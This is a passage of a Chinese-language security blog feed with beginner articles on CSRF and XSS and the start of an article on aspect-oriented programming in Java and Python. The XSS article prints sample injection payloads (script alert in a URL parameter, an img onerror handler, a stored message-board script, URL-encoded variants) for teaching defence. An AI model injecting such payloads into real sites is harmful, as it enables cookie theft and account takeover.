&lt;li&gt;User 獲得 Cookie 並存至 User 瀏覽器&lt;/li&gt;
&lt;li&gt;User 在未登出 A 網站的情況下瀏覽 B 網站，接著 Hacker 以 B 網站的 Domain 以 A 網站給 User 的 Cookie 對 A 網站發送請求，如果 A 網站沒發現的話就 GG 了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;＊Ｂ網站會在自身的網站中加入含 A 網站 Domain 的 Javascript ，例如：上方圖中的 &lt;strong&gt;A/pay?to=B&lt;/strong&gt; ，這裡的 A 就是指 A 網站 Domain ，然後去執行 Pay 這個動作給 B ，這個攻擊的破綻就是剛剛前言例子中提到的，送出資料的Domain 不同，另外，貼心小提醒，在惡意網站中就算只是滑鼠移過圖片也可能會執行惡意的 Javascript 千萬不要覺得我都不點就沒事。&lt;/p&gt;
&lt;p&gt;通常 Hacker 發現網站有漏洞時，都會以金流及竊取隱私資料為主要攻擊面向，畢竟 Hacker 除了做興趣也是要吃飯，因此當網站在設計關於金流及隱私資料的架構時需要特別小心，&lt;/p&gt;
&lt;h2 id=&quot;hacker%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#hacker%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B&quot;&gt;#&lt;/a&gt; Hacker實際利用CSRF漏洞案例&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-cross-site-request-forgery/p2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;strong&gt;photo by &lt;a href=&quot;https://www.ithome.com.tw/news/139205&quot;&gt;https://www.ithome.com.tw/news/139205&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;這個新聞是經典的 XSS 與 CSRF 聯動的漏洞， Hacker 在注入 XSS 之後，只要造訪被注入 XSS 頁面的是主辦單位， Hacker 可利用 CSRF 漏洞把自己的角色變更為協辦單位，而獲得可以存取社團所有功能的權限，包括利用程式變更主辦單位 PayPal 帳號的電子郵件，這表示之後這個社團舉辦的各種活動所收取的款項，都會流落到 Hacker 所指定的帳號中，而且因為電子郵件被變更，所以主辦單位也不會收到任何的郵件通知。&lt;/p&gt;
&lt;p&gt;＊如果是對 XSS 不了解的朋友，歡迎看我的第二篇文章喔 XD&lt;/p&gt;
&lt;h3 id=&quot;%E9%81%94%E6%88%90-csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%81%94%E6%88%90-csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0&quot;&gt;#&lt;/a&gt; 達成 CSRF 攻擊流程三要素&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;有一個可以觸發惡意腳本的動作&lt;/li&gt;
&lt;li&gt;只以單一條件驗證網站身份，例如：只驗證 cookie 或 token&lt;/li&gt;
&lt;li&gt;沒有驗證或是驗證的參數可以預測（固定的 cookie ）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;%E5%A6%82%E4%BD%95%E9%98%B2%E7%AF%84-csrf&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A6%82%E4%BD%95%E9%98%B2%E7%AF%84-csrf&quot;&gt;#&lt;/a&gt; 如何防範 CSRF&lt;/h2&gt;
&lt;p&gt;防範 CSRF 的重點在於打破 CSRF 攻擊流程三要素，&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;增加所有敏感動作的驗證方式，例如：金流、提交個資 等…多加一道驗證碼的機制&lt;/li&gt;
&lt;li&gt;增加無法預測的參數，常見且有效的防範方式例如：&lt;strong&gt;CSRF token (在頁面的 form 或是 custom header 裡面放一個 token 並要求 client request 要夾帶這個 token )&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;%E5%AF%A6%E4%BD%9C-csrf-token-%E9%82%8F%E8%BC%AF&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E4%BD%9C-csrf-token-%E9%82%8F%E8%BC%AF&quot;&gt;#&lt;/a&gt; 實作 CSRF Token 邏輯&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;建立&lt;/strong&gt;：在 User 打開網頁時，Server 會根據 User 的身份生成一個 Token ，將 Token 存放在頁面中（通常生成的基礎是 User 名稱加上隨機亂數或是時間戳記的加密組合，另外需要注意的是 Token 需要額外放置，不能依然存放在 Cookie 中，不然一樣會被整包帶走 ，建議是存在 Server 的 Session中）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;傳送請求&lt;/strong&gt;：之後只要有添加 Token 的頁面在提交請求時，都需要加上這個Token ，請求才會被允許，通常對於GET請求，Token會附在請求的網址之後，這樣 URL 會變成   &lt;code&gt;http://url?csrftoken=tokenvalue&lt;/code&gt;而 POST 請求則會在 form 的最後加上：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;&amp;lt;input type=「hidden」 name=「csrftoken」 value=「tokenvalue」/&gt;`&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把Token以參數的形式加入請求了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;驗證&lt;/strong&gt;：當 User 發送當有請求的 Token 給 Server 時，Server 為了要確定 Token 的時間有效性和正確性，會先解密 Token，對比加密過後的 User 名稱和當時的隨機亂數及時間戳記，如果加密的資料一致而且時間戳記沒有過期，Server 就會驗證通過，確認 Token 是有效的。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;除了加上 CSRF Token 及多重驗證的防範方式以外，為避免 CSRF 風險，建議在每階段架構和設計時，使用經過審查的套件或框架。 使用諸如 owasp csrfguard 之類的反 CSRF 套件可以降低網頁 CSRF 的風險。&lt;/p&gt;
&lt;p&gt;之後會再另開文章說明 CSRF 的兄弟 XSS 與網頁安全三本柱 Secure 、 samsite 、 httponly 他們之間不得不說的故事。&lt;/p&gt;
&lt;h2 id=&quot;%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B&quot;&gt;#&lt;/a&gt; 名詞解釋&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;註1&lt;/strong&gt;：cookie：用來記錄User在網站上的操作及憑證，大多數電商網站，如PChome等都會使用 cookie 來紀錄網頁上的的操作資訊，常見的是紀錄購物車、會員登入或瀏覽紀錄、停留時間等，讓Web可以識別用戶的身分，User登入過後，可以無需再次登入就可以直接進行操作，。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;註2&lt;/strong&gt;：domain：指的是網域名稱，簡單來說就是網站的地址，就如同住家地址一般，寄信的時候可以讓對方知道信是從哪裡寄來的。&lt;/p&gt;
&lt;p&gt;熱騰騰的XSS文章出爐啦～&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;#&lt;/a&gt; 延伸閱讀&lt;/h2&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;認識 XSS(Cross-Site Scripting&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.techbridge.cc/2017/02/25/csrf-introduction/&quot;&gt;https://blog.techbridge.cc/2017/02/25/csrf-introduction/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://kknews.cc/zh-tw/tech/veqpbna.html&quot;&gt;https://kknews.cc/zh-tw/tech/veqpbna.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0&quot;&gt;https://zh.wikipedia.org/wiki/跨站請求偽造&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/"/>
		<updated>2021-05-27T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;你＝&lt;strong&gt;User&lt;/strong&gt; 陌生人＝&lt;strong&gt;Hacker&lt;/strong&gt; 菜單＝&lt;strong&gt;Request&lt;/strong&gt; 桌號＝&lt;strong&gt;cookie&lt;/strong&gt; 老闆＝&lt;strong&gt;web server&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;想像你到一家餐廳吃飯，陌生人在有你桌號的菜單備註寫上無敵大辣，接著你沒有發現便直接把菜單送給老闆，然後老闆就送來了一份加了無敵大辣的餐點 ，這就是 XSS 的基礎概念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E9%87%8B%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%87%8B%E4%BE%8B&quot;&gt;#&lt;/a&gt; 釋例&lt;/h2&gt;
&lt;p&gt;以前言的範例來做說明，當網頁在進行 browser render &lt;strong&gt;註1&lt;/strong&gt;的時候（老闆收到菜單開始做菜），使用者&lt;strong&gt;輸入的欄位&lt;/strong&gt;或是&lt;strong&gt;沒有被驗證的參數&lt;/strong&gt;就被嵌入在網頁的程式碼（菜單）裡面，如果這段輸入包含惡意程式（被備註無敵大辣）就會導致使用者瀏覽這個頁面的時候觸發這段惡意程式，導致 XSS 風險的發生。&lt;/p&gt;
&lt;h2 id=&quot;xss%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#xss%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B&quot;&gt;#&lt;/a&gt; XSS攻擊流程&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-cross-site-scripting/p1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Hacker 在受害網站注入 XSS 漏洞&lt;/li&gt;
&lt;li&gt;透過社交工程手法傳送惡意 URL 給 User&lt;/li&gt;
&lt;li&gt;當 User 點擊 URL 便會把自己的資料（cookie）藉由受害網站傳回給 Hacker&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;xss%E4%B8%89%E5%A4%A7%E7%A8%AE%E9%A1%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#xss%E4%B8%89%E5%A4%A7%E7%A8%AE%E9%A1%9E&quot;&gt;#&lt;/a&gt; XSS三大種類&lt;/h2&gt;
&lt;h3 id=&quot;%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%EF%BC%88reflected%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%EF%BC%88reflected%EF%BC%89&quot;&gt;#&lt;/a&gt; 反射型 XSS （Reflected）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最常見的 XSS 攻擊類型，通常是將惡意程式會藏在網址列裡，放在 GET 參數傳遞，範例如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;http://www.example.com/upload.asp?id=&amp;lt;script&gt;alert(1);&amp;lt;/script&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;這種手法要能夠成功攻擊，需要使用社交工程釣魚的技巧，使 User 點擊URL 攻擊才會生效。&lt;/li&gt;
&lt;li&gt;因為 URL 通常看起來很詭異，所以 Hacker 通常會使用短網址或 HTML Encoder 註2的方式嘗試欺騙 User。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;dom-%E5%9E%8B-xss&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dom-%E5%9E%8B-xss&quot;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;這種手法和反射型 XSS一樣，都需要使用社交工程釣魚的技巧，使 User 點擊 URL 攻擊才會生效。&lt;/li&gt;
&lt;li&gt;Hacker 在 URL 輸入 DOM &lt;strong&gt;註3&lt;/strong&gt; 物件，把物件嵌入網頁程式碼，範例：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;&amp;lt;img src=# onerror=”alert(123)”&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E5%84%B2%E5%AD%98%E5%9E%8B-xss-(-stored-)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%84%B2%E5%AD%98%E5%9E%8B-xss-(-stored-)&quot;&gt;#&lt;/a&gt; 儲存型 XSS ( Stored )&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;與前兩種手法不同的是此種攻擊手法不需要使用社交工程釣魚的技巧，也能使 User 受到攻擊&lt;/li&gt;
&lt;li&gt;攻擊的方式是 Hacker 將 Javascript 儲存在伺服器的資料庫中，進而引起使 User 遭受攻擊。&lt;/li&gt;
&lt;li&gt;最常見的例子就是將 Javascript 注入留言板，當下一位 User 瀏覽網頁時，網頁會載入留言板的 Javascript 進而使 User 受到攻擊，範例如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;我是壞人！ &amp;lt;script&gt;alert(1);&amp;lt;/script&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然後當 User 瀏覽網頁的時候，就會因為網頁先載入了當下頁面的惡意程式，於是 User 的頁面就會跳出一個 1 的 alert，以此類推， Hacker 在這裡如果輸入讓 User 傳送 cookie 或是其他惡意程式行為，網頁也會完全照做！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;執得一提的是，在三種XSS攻擊中，DOM 型 XSS 和另外兩種 XSS 的區別是 DOM 型 XSS 攻擊中，提取和執行惡意程式都是由 Browser 端完成，屬於前端 JavaScript 的安全漏洞，而其他兩種 XSS 都是因為伺服器而產生的安全風險。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E9%A7%AD%E5%AE%A2%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A7%AD%E5%AE%A2%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B&quot;&gt;#&lt;/a&gt; 駭客實際利用XSS漏洞案例&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-cross-site-scripting/p2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;strong&gt;photo by &lt;a href=&quot;https://www.ithome.com.tw/news/139205&quot;&gt;https://www.ithome.com.tw/news/139205&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;與上期一樣的實際案例，以這個風險來做一個接續的說明，這個風險除了 CSRF 以外，也有儲存型 XSS 的風險，會允許駭客將惡意程式貼到討論區中，而當 User 以瀏覽器造訪頁面時，網頁便會在背景執行程式，卻看不到程式碼。&lt;/p&gt;
&lt;p&gt;上期的 CSRF 就是預設主辦單位中了此類型的儲存型 XSS 的風險後，被 XSS 中的惡意程式竊取了權限，進而導致了 CSRF 的風險，使 Hacker 能夠以主辦單位的權限執行操作。&lt;/p&gt;
&lt;h2 id=&quot;%E9%98%B2%E7%AF%84xss%E7%9A%84%E6%BA%96%E5%89%87&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%98%B2%E7%AF%84xss%E7%9A%84%E6%BA%96%E5%89%87&quot;&gt;#&lt;/a&gt; 防範XSS的準則&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;做好欄位輸入的驗證與檢查，不論是前後端都應假設輸入是惡意且不可信任的，例如：URL、檔案上傳、表單欄位、留言板等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文法與語意：應確認每個網頁表單輸入欄位是否為合理的資料類型與內容，例如：年齡的欄位在文法上應只接受0–9的數字，而語意上應確認此數字介於 0–120。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;像上述所說明的任何輸入和其他難以定義文法的自由格式，都應該要經過編碼成為純字符串來處理，防止內容被當作程式碼執行，許多程式框架都有提供內建的編碼函式庫，可以依自己的慣用語言程式查找並多加利用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;絕對不要將使用者的輸入放入 註解、屬性名稱、標籤名稱 等，因為這些位置都能將字符串作為程式碼運行&lt;br&gt;
另外，於伺服器上可作以下設定增強&lt;strong&gt;瀏覽器&lt;/strong&gt;的防護：&lt;br&gt;
•對 cookie 設定 HttpOnly 的屬性，確保程式碼沒有存取權&lt;br&gt;
•設定內容安全策略（CSP）的標頭，明確定義允許瀏覽器在該頁面上加載的內容來源，涵蓋的類型包括 JavaScriptCSS、HTML框架、字體、圖片和可嵌入對象，例如 Java applet、ActiveX等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B&quot;&gt;#&lt;/a&gt; 名詞解釋&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;註1&lt;/strong&gt;：Browser Render：瀏覽器渲染（ browser render ）是將 URL 對應的各種資源，通過瀏覽器的渲染引擎進行解析，輸出視覺化的影象，渲染引擎包括像是 HTML 直譯器、佈局（ layout ）、CSS 直譯器和 JavaScript 引擎。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;註2&lt;/strong&gt;：HTML Encoder：這是為了避免特殊符號造成的顯示問題，以及避免HTML 將 URL 中的特殊符號視為語法而產生的編碼，範例如下：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;&amp;lt;script&gt;alert(1);&amp;lt;/script&gt; &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;會被轉換成&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但在這裡 Hacker 會反其道而行故意將要輸入在 URL 的特殊符號先轉換成 HTML Encoder 輸入，讓 WebSever 解析成特殊符號，進而進行 XSS 攻擊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;註3&lt;/strong&gt;：DOM：DOM 全名為 Document Object Model，是用來描述 HTML 文件的表示法，可以使用 JavaScript 來動態產生完整的網頁，而不必透過伺服器，簡單來說就是把一份 HTML 文件中的各種標籤及文字、圖片等，都定義成一個個網頁物件，而這些物件最終會成為一個樹狀結構，範例如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-cross-site-scripting/p3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;講完了 CSRF 和 XSS 這對兄弟，接著下一篇會說明網頁安全三本柱 Secure 、 samsite 、 Httponly 他們之間不得不說的故事，再之後會提到關於內容安全策略（CSP）和跨域資源共用（CORS）與網頁安全的關係。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;#&lt;/a&gt; 延伸閱讀&lt;/h2&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89--%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89--%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（一）- 認識 CSRF（Cross Site Request Forgery）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery&quot;&gt;認識 CSRF(Cross Site Request Forgery )&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>來談談 AOP (Aspect-Oriented Programming) 的精神與各種主流實現模式的差異</title>
		<link href="https://tech-blog.cymetrics.io/posts/maxchiu/aop/"/>
		<updated>2021-05-27T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/maxchiu/aop/</id>
		<content type="html">
		  &lt;p&gt;這篇文章將從 AOP 的核心思想談到目前主流實現 AOP 的不同策略並比較他們的差異，適合了解 Java 語言或者有稍微玩過 AOP 但是不清楚其原理的人閱讀。&lt;/p&gt;
&lt;p&gt;隨著軟體專案規模的擴大，程式碼的維護基本上已經變成了一個世紀難題，學界和業界一直以來都持續許多降低程式碼維護難度的方案。 &lt;a href=&quot;https://en.wikipedia.org/wiki/Aspect-oriented_programming&quot;&gt;AOP ( Aspected-Oriented Programming )&lt;/a&gt; 作為一個在上世紀末就被提出的編程典範，這數十年來也經歷了許多的轉變。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;這篇文章會先討論 AOP 的行為本質，並剖析 Java 語言中 AOP 實現的幾種模式，並且比較彼此之間的行為。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h4 id=&quot;aop-%E7%9A%84%E6%9C%AC%E8%B3%AA-%E2%80%94-%E6%94%B9%E8%AE%8A%E7%A8%8B%E5%BC%8F%E7%A2%BC%E7%9A%84%E6%B5%81%E7%A8%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#aop-%E7%9A%84%E6%9C%AC%E8%B3%AA-%E2%80%94-%E6%94%B9%E8%AE%8A%E7%A8%8B%E5%BC%8F%E7%A2%BC%E7%9A%84%E6%B5%81%E7%A8%8B&quot;&gt;#&lt;/a&gt; AOP 的本質 — 改變程式碼的流程&lt;/h4&gt;
&lt;p&gt;以 Web Server 開發場景為例，我們經常會需要在很多 end-point API 的方法執行前先執行權限驗證，或者是在這些 end-point 執行 transaction 失敗時可以 rollback。&lt;/p&gt;
&lt;p&gt;這些在程式碼中會重複出現，它們是重要但是不屬於我們核心業務的操作，如果要重複複製貼上到專案中的各處會造成難以維護的窘境。因此 AOP 試圖讓這些常被複用的邏輯獨立出來，用特殊的機制包裝起來，讓我們的業務邏輯不需要去看到任何相關的程式碼。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/TheSpiritAndImplementationOfAOP/0____Bm36Dv5mm97e2vF.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;這件事本質上聽起來跟呼叫函式沒有太大的區別，然而 AOP 本質上是屬於一種 &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Meta Programming&lt;/a&gt; 。具體來說，實現 AOP 的工具處理的是程式碼本身（或 bytecode本身） 或是 class (或 object ) 的資訊，是用來改變程式碼的流程或織入（ weaving ) 新的程式碼，而非只是單純地「執行一段程式」。&lt;/p&gt;
&lt;p&gt;AOP 只是種指導編程模式的原則而已，在不同的語言和生態系中，類似的概念都有不同的實作方式，然而共通點都是藉由改變程式碼的流程讓核心邏輯不會受到額外的切面邏輯的影響。&lt;/p&gt;
&lt;p&gt;在靜態語言中，程式的流程在編譯時期就會被寫死了，要穿插切面在程式碼各處會需要有額外的工具來支持。而在動態語言中，因為程式的流程並不是在編譯時期就被決定了，而是可以動態更改的，所以通常原生語法就支持了 AOP 功能。&lt;/p&gt;
&lt;p&gt;以 Python 為例，Python內建的 decorator 修飾詞可以將被切入 （ advised ) 的函式直接傳入別的函式，並且藉由回傳另一個已經被修飾完成的函式物件來實現 AOP （ 至於這究竟是不是一種 &lt;a href=&quot;https://en.wikipedia.org/wiki/Decorator_pattern&quot;&gt;Decorator Pattern&lt;/a&gt; 的實現，可以參 考 [2] 的討論）&lt;/p&gt;
&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decorator&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;func&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wrapper&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;# 執行前的關注切面, &lt;/span&gt;&lt;br&gt;        func&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;# 執行後的關注切面&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; wrapper&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@decorator&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decorated&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;# 核心業務邏輯&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而在 Javascript 來說， ES7 之後也開始支援跟 Python 類似語法的 decorator。&lt;/p&gt;
